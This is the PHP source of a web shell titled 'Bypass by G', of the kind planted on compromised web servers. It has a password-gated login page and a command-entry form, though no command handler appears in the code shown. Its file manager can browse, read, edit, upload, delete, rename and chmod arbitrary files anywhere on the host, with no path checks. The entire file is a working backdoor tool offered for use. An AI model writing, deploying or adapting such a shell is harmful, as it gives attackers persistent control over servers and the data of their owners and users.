<?php
$correct_password_hash = '$2a$10$57a.0BATz4Zb/.OiZXzzAOA3swIgmdjxBfGOQvEZx/wrNDXTQh7B6';
if (!isset($_COOKIE['loggedin']) || $_COOKIE['loggedin'] !== $correct_password_hash) {
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $password = $_POST['password'];

        if (password_verify($password, $correct_password_hash)) {
            setcookie('loggedin', $correct_password_hash, time() + (86400 * 30), "/");
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = 'Incorrect password';
        }
    }
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Login</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f8f8f8;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .login-container {
                background-color: #fff;
                padding: 20px;
                border-radius: 5px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            }
            h1 {
                margin-bottom: 20px;
                font-size: 24px;
                text-align: center;
            }
            input[type="password"] {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #ddd;
                border-radius: 3px;
            }
            input[type="submit"] {
                width: 100%;
                padding: 10px;
                border: none;
                border-radius: 3px;
                background-color: #333;
                color: #fff;
                cursor: pointer;
            }
            input[type="submit"]:hover {
                background-color: #555;
            }
            .error {
                color: red;
                margin: 10px 0;
                text-align: center;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h1>Login</h1>';
    if (isset($error)) {
        echo '<p class="error">' . $error . '</p>';
    }
    echo '<form method="post" action="">
                <input type="password" name="password" placeholder="Password" required>
                <input type="submit" value="Login">
            </form>
        </div>
    </body>
    </html>';
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Bypass by G</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f8f8f8;
            color: #333;
        }
        .container {
            width: 90%;
            margin: 20px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            font-size: 24px;
            color: #333;
            text-align: center;
        }
        .command-section, .upload-section, .new-folder-section, .new-file-section {
            margin-bottom: 20px;
        }
        .command-section input[type="text"], .upload-section input[type="file"], .new-folder-section input[type="text"], .new-file-section input[type="text"] {
            width: 70%;
            padding: 10px;
            margin-right: 10px;
            border: 1px solid #ddd;
            border-radius: 3px;
        }
        .command-section input[type="submit"], .upload-section input[type="submit"], .new-folder-section input[type="submit"], .new-file-section input[type="submit"], .home-file-section input[type="submit"] {
            padding: 10px 20px;
            border: 1px solid #333;
            border-radius: 3px;
            background-color: #fff;
            color: #333;
            cursor: pointer;
        }
        .command-section input[type="submit"]:hover, .upload-section input[type="submit"]:hover, .new-folder-section input[type="submit"]:hover, .new-file-section input[type="submit"]:hover, .home-file-section input[type="submit"]:hover {
            background-color: #f0f0f0;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 10px;
            border: 1px solid #ddd;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        tr:nth-child(even) {
            background-color: #f9f9f9;
        }
        tr:hover {
            background-color: #f1f1f1;
        }
        .item-name {
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .directory {
            color: blue;
        }
        .file {
            color: black;
        }
        .size {
            width: 100px;
        }
        .permission {
            text-align: center;
        }
        .breadcrumb {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        .breadcrumb p {
            margin: 0;
        }
        .breadcrumb a {
            color: #333;
            text-decoration: none;
        }
        .breadcrumb a:hover {
            text-decoration: underline;
        }
        .breadcrumb span {
            margin: 0 5px;
        }
        .breadcrumb .home-file {
            margin-left: 5px;
            background-color: #fff;
            border: 1px solid #333;
            padding: 5px 10px;
            border-radius: 3px;
        }
        .breadcrumb .home-file input {
            background-color: #fff;
            border: none;
            color: #333;
            cursor: pointer;
        }
        .breadcrumb .home-file input:hover {
            background-color: #f0f0f0;
        }
    </style>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            if (window.location.search.includes("?d=")) {
                const url = new URL(window.location);
                url.searchParams.delete('d');
                window.history.replaceState({}, document.title, url.pathname);
            }
        });
    </script>
</head>
<body>
    <div class="container">
        <h1>Bypass by G</h1>
        <div class="command-section">
            <form method="post" action="?<?php echo isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : ''; ?>">
                <label for="cmd_biasa">Run Command:</label>
                <input type="text" name="cmd_biasa" id="cmd_biasa" placeholder="Enter command">
                <input type="submit" value="Run Command">
            </form>
        </div>
        <hr>
        <div class="breadcrumb">
            <p>Current Directory: 
            <?php
            $currentDirectory = realpath(isset($_POST['current_directory']) ? $_POST['current_directory'] : (isset($_GET['d']) ? $_GET['d'] : getcwd()));
            $directories = explode(DIRECTORY_SEPARATOR, trim($currentDirectory, DIRECTORY_SEPARATOR));
            $path = '/';
            echo '<a href="?d=' . urlencode($path) . '">/</a>';
            foreach ($directories as $index => $dir) {
                $path .= $dir . DIRECTORY_SEPARATOR;
                echo '<a href="?d=' . urlencode($path) . '">' . $dir . '</a>';
                if ($index < count($directories) - 1) {
                    echo ' / ';
                }
            }
            ?></p>
            <form class="home-file" method="get">
                <input type="hidden" name="d" value="<?php echo getcwd(); ?>">
                <input type="submit" value="HOME SHELL">
            </form>
        </div>
        <div class="upload-section">
            <form method="post" enctype="multipart/form-data">
                <input type="hidden" name="current_directory" value="<?php echo htmlspecialchars($currentDirectory); ?>">
                <input type="file" name="file_to_upload" id="file_to_upload">
                <input type="submit" value="Upload File">
            </form>
        </div>
        <div class="new-folder-section">
            <form method="post">
                <input type="hidden" name="current_directory" value="<?php echo htmlspecialchars($currentDirectory); ?>">
                <input type="text" name="folder_name" placeholder="New Folder Name">
                <input type="submit" value="Create Folder">
            </form>
        </div>
        <div class="new-file-section">
            <form method="post">
                <input type="hidden" name="current_directory" value="<?php echo htmlspecialchars($currentDirectory); ?>">
                <input type="text" name="file_name" placeholder="Create New File">
                <input type="submit" value="Create File">
            </form>
        </div>
        <table>
            <tr>
                <th>File Name</th>
                <th>Type</th>
                <th>Size</th>
                <th>Permissions</th>
                <th>Owner</th>
                <th>Options</th>
            </tr>
            <?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file_to_upload'])) {
                $currentDirectory = realpath($_POST['current_directory']);
                $targetFile = $currentDirectory . '/' . basename($_FILES['file_to_upload']['name']);
                move_uploaded_file($_FILES['file_to_upload']['tmp_name'], $targetFile);
            }
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['folder_name'])) {
                $currentDirectory = realpath($_POST['current_directory']);
                $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
                mkdir($newFolder);
            }
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_name'])) {
                $currentDirectory = realpath($_POST['current_directory']);
                $newFile = $currentDirectory . '/' . $_POST['file_name'];
                file_put_contents($newFile, '');
            }

            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['view_file'])) {
                $currentDirectory = realpath($_POST['current_directory']);
                $fileToView = $currentDirectory . '/' . $_POST['view_file'];
                echo '<pre>' . htmlspecialchars(file_get_contents($fileToView)) . '</pre>';
            }
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['edit_file'])) {
                $currentDirectory = realpath($_POST['current_directory']);
                $fileToEdit = $currentDirectory . '/' . $_POST['edit_file'];
                if (isset($_POST['file_content'])) {
                    file_put_contents($fileToEdit, $_POST['file_content']);
                } else {
                    echo '<form method="post">
                            <input type="hidden" name="current_directory" value="' . htmlspecialchars($currentDirectory) . '">
                            <input type="hidden" name="edit_file" value="' . htmlspecialchars($_POST['edit_file']) . '">
                            <textarea name="file_content">' . htmlspecialchars(file_get_contents($fileToEdit)) . '</textarea>
                            <input type="submit" value="Save">
                          </form>';
                }
            }
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_file'])) {
                $currentDirectory = realpath($_POST['current_directory']);
                $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
                if (is_dir($fileToDelete)) {
                    rmdir($fileToDelete);
                } else {
                    unlink($fileToDelete);
                }
            }
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['rename_file'])) {
                $currentDirectory = realpath($_POST['current_directory']);
                $oldName = $currentDirectory . '/' . $_POST['rename_file'];
                $newName = $currentDirectory . '/' . $_POST['new_name'];
                rename($oldName, $newName);
            }
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['chmod_file'])) {
                $currentDirectory = realpath($_POST['current_directory']);
                $fileToChmod = $currentDirectory . '/' . $_POST['chmod_file'];
                $newPermissions = octdec($_POST['new_permissions']);
                chmod($fileToChmod, $newPermissions);
            }
            $items = scandir($currentDirectory);
            foreach ($items as $item) {
                if ($item == '.' || $item == '..') continue;
                $itemPath = $currentDirectory . '/' . $item;
                $isDir = is_dir($itemPath);
                $size = $isDir ? '-' : filesize($itemPath) . ' bytes';
                $permissions = substr(sprintf('%o', fileperms($itemPath)), -4);
                $ownerInfo = posix_getpwuid(fileowner($itemPath));
                $owner = $ownerInfo['name'];
                echo "<tr>
                        <td class='item-name " . ($isDir ? 'directory' : 'file') . "'><a href='" . ($isDir ? '?d=' . urlencode($itemPath) : '#') . "'>" . htmlspecialchars($item) . "</a></td>
                        <td>" . ($isDir ? 'Directory' : 'File') . "</td>
                        <td class='size'>" . $size . "</td>
                        <td class='permission'>" . $permissions . "</td>
                        <td class='owner'>" . $owner . "</td>
                        <td>
                            <form style='display:inline;' method='post' action=''>
                                <input type='hidden' name='current_directory' value='" . htmlspecialchars($currentDirectory) . "'>
                                <input type='hidden' name='view_file' value='" . htmlspecialchars($item) . "'>
                                <input type='submit' value='View'>
                            </form>
                            <form style='display:inline;' method='post' action=''>
                                <input type='hidden' name='current_directory' value='" . htmlspecialchars($currentDirectory) . "'>
                                <input type='hidden' name='edit_file' value='" . htmlspecialchars($item) . "'>
                                <input type='submit' value='Edit'>
                            </form>
                            <form style='display:inline;' method='post' action=''>
                                <input type='hidden' name='current_directory' value='" . htmlspecialchars($currentDirectory) . "'>
                                <input type='hidden' name='delete_file' value='" . htmlspecialchars($item) . "'>
                                <input type='submit' value='Delete'>
                            </form>
                            <form style='display:inline;' method='post' action=''>
                                <input type='hidden' name='current_directory' value='" . htmlspecialchars($currentDirectory) . "'>
                                <input type='hidden' name='rename_file' value='" . htmlspecialchars($item) . "'>
                                <input type='text' name='new_name' placeholder='Rename'>
                                <input type='submit' value='Rename'>
                            </form>
                            <form style='display:inline;' method='post' action=''>
                                <input type='hidden' name='current_directory' value='" . htmlspecialchars($currentDirectory) . "'>
                                <input type='hidden' name='chmod_file' value='" . htmlspecialchars($item) . "'>
                                <input type='text' name='new_permissions' placeholder='Chmod'>
                                <input type='submit' value='Chmod'>
                            </form>
                    </tr>";
            }
            ?>
        </table>
    </div>
</body>
</html>
